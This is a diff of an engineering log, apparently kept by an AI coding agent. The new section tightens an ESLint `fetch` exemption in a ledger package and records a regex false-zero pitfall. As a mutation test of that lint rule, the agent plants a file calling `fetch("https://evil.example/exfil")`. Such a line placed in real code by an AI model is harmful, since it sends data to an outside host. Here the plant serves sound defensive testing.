@@ -632,6 +632,7 @@ triggers — the table below is the complete list, and its last row is the curre
 | 436 | §988 | **§989** | **THE THIRD RULE NAME — AND §815's *THREE DISJOINT BLOCKS* WAS FOUR WITH A DELIBERATE OVERLAP.** `no-restricted-globals` carries **REQ-024's `fetch` ban**, and §815 had recorded its safety as prose. Re-measured: **four blocks, not three**, and two overlap — `packages/ledger/**` (fetch banned) and `packages/ledger/src/tsa/**` (**`"off"`**). My own first scan also said three: it matched array-valued rules and missed `"off"`, the STRONGEST form of deletion — two counts agreed on the wrong number because both looked for the same shape. The overlap is CORRECT (the sanctioned TSA egress; injectable `fetchImpl`, verified protocol). So the true property is not *disjoint* but **only the named TSA exemption overlaps** — a materially different claim, and neither was checked. Tripwire asserts the exact scope list; **a second `"off"` goes RED**. Family closed: 3 rule names, 4 gates, 1 hazard |
 | 437 | §989 | **§990** | **THE SUBSTITUTIVE-CONFIG HAZARD ON PRODUCTION INFRASTRUCTURE — CLEAN, AFTER THREE WRONG PROBES.** Wrangler `[env.X]` blocks do NOT inherit bindings, so one omission deploys prod without it. `binding-parity.test.ts` (10 cases) aims at a different hazard — worker-vs-worker agreement, not top-level-vs-env presence. Measured: **13 env scopes, 0 missing a code-facing binding** (top-level counts: agents 7, api 9, billing 6, mcp 2, translator 6). **Three probes were wrong first:** a section regex that consumed `[[env.staging.d1_databases]]` without recording the kind → **13 of 13 'missing'**, saved only by §968's rule that a 100% hit rate is a broken probe; then kind-level parity (too coarse); then comparing `queue = "…-dev"`, the PHYSICAL name that is SUPPOSED to differ → 4 differences that were not defects. Clean on the hazard whose failure mode is `no such binding` AFTER a deploy, not during |
 | 438 | §990 | **§991** | **STOPPING POINT III — THE ENFORCEMENT LAYER, CLOSED.** Board at `353a06d`: 19 PASS · 2 FAIL · 5 BLOCKED. §972 found every gate worked and none enforced; §973–§990 closed that layer: CI's skipped 26-gate step (§962) and its true cause, a **vacuity floor not a budget** (§963); the four browser gates §962's fix had left fragile (§978) plus the rule gated both ways (§979/§980); and the **lint-config family** — one hazard, four phases: `no-restricted-imports` (§814), `no-restricted-syntax` (§815/§988), `no-restricted-globals` (§989), with REQ-024/163/035/127 all blind to `import()` (§985/§986) and five scopes deleting the repo-wide ban (§988). Plus MCP's api seam (§983), the chokepoint end-to-end (§984), action pinning (§974), Wrangler env bindings clean (§990). **14 gates, every one mutation-proved.** Nine phases contained a defect in my own INSTRUMENT — all failing by producing LESS — which produced the `checked=N` rule |
+| 497 | §1049 | **§1050** | **THE CLOSURE SWEEP — AND AN EXEMPTION WHOSE SCOPE OUTRAN ITS SUBJECT.** §1049's search run over all 21 scope/rule pairs. Most mechanical 'gaps' are NOT defects: the closure question bites for CAPABILITY bans (LLM, network, timers — the capability flows through the import) and not for PROVENANCE bans (REQ-163 lumina — the violation is local, and §988 owns it). The real find was the ledger's `fetch` exemption: scoped `src/tsa/**/*.ts` while its subject is ONE declaration (`fetchImpl: typeof fetch = fetch`, client.ts:76). The config PROMISED *"a second one cannot appear without editing this file"* — a planted `tsa/__p.ts` with a raw fetch linted GREEN, falsifying it. Narrowed to `client.ts`; RED on the plant, clean on the real client, cms/der never needed it. **Also: `\b` is NOT a word boundary in `git grep -E` here** — `\bfetch`→0 where `fetch`→1 — so every `\b` probe this session returned a FALSE ZERO, and one nearly made me delete a live exemption. §1048's verdict survives (it rested on capture-API searches, and the gate uses JS RegExp where `\b` works). |
 | 496 | §1048 | **§1049** | **THE SAME SHAPE ONE LAW OVER — REQ-024's BAN IS DIRECT-IMPORT-ONLY, AND THE LEDGER'S ONLY DEPENDENCY WAS OUTSIDE IT.** `no-restricted-imports` matches SPECIFIERS, so it sees no transitive reach. `packages/ledger` declares exactly ONE first-party dependency — `@shuddl/contracts` — which carried no LLM ban. A planted `@anthropic-ai/sdk` import there was GREEN across eslint, check:invariants, rater-purity and lint-guards, giving the ledger LLM reach with no banned specifier under `packages/ledger`. The assumption was already WRITTEN DOWN in `rater-purity.ts` and enforced by nothing. Fixed by widening the block's `files`; **the repo's own §989 gate rejected the first shape of the fix** (widening every rule widened the `fetch` ban too), so the block is now split by RULE NAME. New `req024-closure.test.ts` COMPUTES the closure so a new ledger dependency cannot silently re-open it. Also: §1048's commit turned a gate red that no pre-commit run could see — **`git grep` reads TRACKED files, so the coverage gate's verdict changes at `git add`, not at file creation**; five verdicts recorded. |
 | 495 | §1047 | **§1048** | **THE ONLY CONFIRM-GATED PROHIBITION WITH AN ADJACENT BUILT CAPABILITY — AND NOTHING GUARDING IT.** CLAUDE.md forbids anything whose REQ row is CONFIRM-GATED while the CONFIRM is open, naming three: Direct merchant, voice recording, escrow settle. All three are unbuilt (0 files each). The asymmetry is the finding: merchant and escrow have NO adjacent code, while voice recording's API is already called in shipping code — `getUserMedia({video:{facingMode:"environment"}})` for REQ-063's forced photo. Planting `audio: true` in that one call left the driver suite, typecheck, lint and check:invariants **ALL FOUR GREEN**. `audio` is absent by AUTHORSHIP, not by ENFORCEMENT. New gate `tools/checks/no-audio-capture.test.ts` derives its authority from the register — it enforces only while REQ-096/REQ-137 are CONFIRM-GATED and RETIRES ITSELF when the owner closes the CONFIRM. Mutation-proved RED on the planted word; 4 tests; suite at its 3-failure REQ-289 baseline (1,230 tests). |
 | 494 | §1046 | **§1047** | **EVERY OPEN ROW NAMES ITS BLOCKER — AND MY CHECK READ THE WRONG CELL.** §1046 rested on the property that *each row states what it is blocked on*, verified on four rows; eighteen are open, so it was a hypothesis until counted. **The single-cell check flagged 6 of 18 as bare, and all six are wrong**: L421 names *without an opt-in marker*, L431 names *NOT diagnosed: a single non-reproducing failure cannot locate a cause*, L426/L427 carry posture in Status and blocker in Owner, and L411/L418 — whose Status is literally `OPEN` — name theirs in **Owner** (*register owner (denylist contents) / infrastructure (the secret)*) and **Expires** (*on binding `IDENTITY_DENYLIST`*). **18 of 18 name their blocker.** The schema is the reason and it is a good one: **Status carries the verdict, Owner who can move it, Expires what event unblocks it** — a bare `OPEN` is not incomplete, it is not where that lives. **A checker that reads one field of a structured record will find it under-specified, and be wrong** — same class as §1039's structural-vs-behavioural and §1040's vocabulary narrowness: **the instrument's shape decided the finding.** Fourth consecutive phase where the record was ahead of the probe |
@@ -61998,4 +61999,97 @@ PACKAGES, and those are different sets unless something makes them agree.
 **STOP.** REQ-024 now covers the ledger's whole first-party closure, computed rather than listed, with the
 fix and both guard branches mutation-proved and all three original properties re-proved after the restructure.
 `test:tools` 1,229 passed / 3 failed — the REQ-289 baseline. lint clean · citations 0 · tables OK.
+
+## §1050 — PHASE GATE: the closure sweep, and an exemption whose scope outran its subject
+
+**Why this phase.** §1049 ended with a stated search: *for every scoped prohibition, compute the scope's
+dependency closure and ask whether the prohibition covers it.* §1049 fixed one instance;
+[[n-instances-usually-share-one-idiom]] says that at instance #2 you stop fixing and start counting. So this
+phase ran the sweep over **all 21 scope/rule pairs** in `eslint.config.mjs`.
+
+### Most "gaps" are not defects, and the distinction is what the sweep is for
+
+The mechanical closure check flags 14 of 21. Reading them, the flag means two entirely different things:
+
+| ban kind | example | does a transitive reach matter? |
+|---|---|---|
+| **capability** | REQ-024 LLM · `fetch` · timers/DOM | **yes** — the capability flows through the import. A dependency that can call an LLM gives its importer LLM reach. |
+| **provenance** | REQ-163 (no lumina/2023 merges) | **no** — the violation is a specific `import` statement in a specific file, and that file's own scope decides. §988 already owns it. |
+
+A sweep that reported all 14 would be reporting its own mechanism. `packages/agents` reaching
+`adapters, contracts, design, rater` is not a REQ-163 hole, because nothing in those packages can make *agents*
+import lumina. That distinction is the finding's denominator: of the 14, only the capability bans are live
+questions, and of those the ledger's was closed at §1049.
+
+### The real find: an exemption scoped to a directory, subject to one line
+
+`no-restricted-globals` bans `fetch` package-wide in the ledger, with one exemption. The config states its own
+guarantee:
+
+> *"The ledger has exactly ONE sanctioned egress... Keeping the ban package-wide with a single named exception
+> is the point — it makes that egress the only one, visibly, **so a second one cannot appear without editing
+> this file and explaining itself**."*
+
+**MEASURED — I planted `packages/ledger/src/tsa/__p.ts` containing a raw
+`fetch("https://evil.example/exfil")`: it linted GREEN, with no config edit.** The exemption is
+`files: ["packages/ledger/src/tsa/**/*.ts"]` — and `**/*.ts` exempts a *directory*. A directory is an
+invitation; the review step the comment promises did not exist.
+
+The exemption's subject is exactly one declaration: `HttpTsaClient`'s `fetchImpl: typeof fetch = fetch` default
+at `client.ts:76`, used once at `:82`. `cms.ts` and `der.ts` are pure DER/CMS encoding with **zero** network
+tokens. Narrowed to `files: ["packages/ledger/src/tsa/client.ts"]` — free today, and it makes the promise
+enforceable rather than aspirational.
+
+| probe | result |
+|---|---|
+| planted `tsa/__p.ts` with raw `fetch` | **RED** ✓ — a second egress now requires editing that line |
+| the real `client.ts` | clean ✓ — the genuine exemption survives |
+| `cms.ts` + `der.ts` | clean ✓ — they never needed it |
+
+§989's pinned scope set was updated deliberately, which is what a change-detector is for.
+
+> **An exemption is a scope, and its scope is almost never its subject.** The subject is a line; the scope is
+> whatever was convenient to type. `**` costs nothing to write and grants everything under it, forever, to
+> files that do not exist yet.
+
+### The measurement defect that nearly produced a wrong deletion
+
+My first read of the TSA subtree said **zero** network tokens — including zero `fetch` — and I was one commit
+from deleting the exemption as subjectless. The gate's own RED is what stopped me, and the disagreement was
+mine:
+
+```
+git grep -cE '\bfetch' packages/ledger/src/tsa/   →  0 files
+git grep -cE   'fetch'  packages/ledger/src/tsa/   →  1 file
+git grep -cE '\bclass' packages/ledger/src        →  0 files
+git grep -cE   'class'  packages/ledger/src        →  12 files
+```
+
+**`\b` is not a word boundary in `git grep -E` here.** It is a GNU/PCRE extension, and every `\b` probe run
+this session returned a FALSE ZERO. This is [[a-false-clean-invites-no-follow-up]] with a new mechanism: not a
+missing corpus, not a wrong glob — a *matcher silently meaning something else*, in the one direction that never
+prompts a second look.
+
+**§1048's verdict survives, checked rather than assumed.** Its `\bvoice\b → 0` line was a false zero, but the
+conclusion never rested on it: the capture-API searches (`getUserMedia`, `MediaRecorder`, `AudioContext`,
+`SpeechRecognition`) used no `\b`, and re-run with a working matcher the 10 non-`invoice` hits are all
+*"tenant voice"* — a config-seeded email from-name, explicitly *"never model output"*. The gate itself is
+unaffected: it uses JS `RegExp`, where `\b` works correctly (verified). The false zero also never reached this
+record — §1048 states only that `voice` matched `in-voice-`, which is true.
+
+### What this phase says
+
+> **A gate disagreeing with your grep is not a gate to be explained away — it is the better instrument.** Twice
+> now the tooling has been right and my probe wrong: §1041's no-op mutation, and here a matcher that quietly
+> meant something other than what it said. The reflex to trust the hand-run and doubt the gate is exactly
+> backwards, because the gate was written once and reviewed, while the probe was typed a second ago.
+
+The corollary for this record: **a probe's syntax is part of its evidence.** A count reported without the
+command that produced it cannot be re-checked, and this session has now produced five zsh/regex artefacts
+(`--include=*.md` glob-eaten ×3, `.eslintrc*` nomatch, `\b` in ERE) — every one of which rendered as a clean
+result rather than an error.
+
+**STOP.** The closure sweep is complete over all 21 scope/rule pairs, with capability and provenance bans
+separated rather than counted together; the one live defect it surfaced is fixed and mutation-proved three
+ways. `pnpm lint` clean · `test:tools` at the REQ-289 baseline.
 
